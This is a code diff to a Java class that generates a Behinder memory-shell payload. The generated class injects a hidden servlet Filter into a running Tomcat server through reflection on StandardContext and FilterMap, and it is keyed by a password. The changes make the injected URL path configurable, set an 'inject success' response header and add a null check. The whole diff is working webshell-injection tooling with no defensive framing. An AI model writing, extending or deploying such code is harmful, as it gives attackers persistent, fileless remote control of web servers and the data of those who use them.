@@ -6,17 +6,17 @@ import org.apache.coyote.RequestInfo;
 import javax.servlet.Filter;
 import javax.servlet.jsp.PageContext;
 
-public class Behinder3 {
+public class Behinder4 {
 
 
 
-    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
+    public static byte[] getMemBehinder3Payload(String pass,String path) throws Exception {
 
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(Filter.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
         classPool.insertClassPath(new ClassClassPath(PageContext.class));
-        classPool.insertClassPath(new ClassClassPath(Behinder3.class));
+        classPool.insertClassPath(new ClassClassPath(Behinder4.class));
 
         String cname = "MemBehinder3"+ System.nanoTime();
         CtClass ctClass = classPool.makeClass("MemBehinder3");
@@ -26,6 +26,7 @@ public class Behinder3 {
         ctClass.setSuperclass(classPool.getCtClass(ClassLoader.class.getName()));
         ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
         ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
+        ctClass.addField(CtField.make("public String tpath = \"" + path + "\";", ctClass));
         ctClass.addField(CtField.make("public String cs = \"UTF-8\";", ctClass));
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletRequest request = null;", ctClass));
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletResponse response = null;", ctClass));
@@ -95,8 +96,8 @@ public class Behinder3 {
                         "        obj.put(\"request\", request);\n" +
                         "        obj.put(\"response\", response);\n" +
                         "        obj.put(\"session\", session);\n"+
-                "\n" +
-                "            //response.setHeader(\"inject\", \"success\");\n" +
+                "               java.lang.System.out.println(111);\n" +
+                "            response.setHeader(\"inject\", \"success\");\n" +
                 "            String k = md5(passwd);\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
@@ -154,7 +155,7 @@ public class Behinder3 {
                 "                } catch (Exception var23) {\n" +
                 "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
                 "                }\n" +
-                "\n" +
+                "                if(filterMap!=null){\n" +
                 "                java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\",null);\n" +
                 "                Object[] filterMaps = (Object[])(findFilterMaps.invoke(standardContext,null));\n" +
                 "                Object[] tmpFilterMaps = new Object[filterMaps.length];\n" +
@@ -171,7 +172,8 @@ public class Behinder3 {
                 "                    }\n" +
                 "                }\n" +
                 "\n" +
-                "                java.lang.System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);\n" +
+                "                java.lang.System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);" +
+                "               }\n" +
                 "return \"inject success\";\n"+
                 "            } catch (Exception e) {\n" +
                 "                   var11 = e.getMessage();\n" +
@@ -194,7 +196,7 @@ public class Behinder3 {
                 "            this.response.setContentType(\"text/html\");\n" +
                 "            this.request.setCharacterEncoding(this.cs);\n" +
                 "            this.response.setCharacterEncoding(this.cs);\n" +
-                "            output.append(this.addFilter(this,\""+cname+"\",\"/*\", this.request));\n" +
+                "            output.append(this.addFilter(this,\""+cname+"\",\"this.tpath\", this.request));\n" +
                 "        } catch (Exception var7) {\n" +
                 "            output.append(\"ERROR:// \" + var7.toString());\n" +
                 "        }\n" +
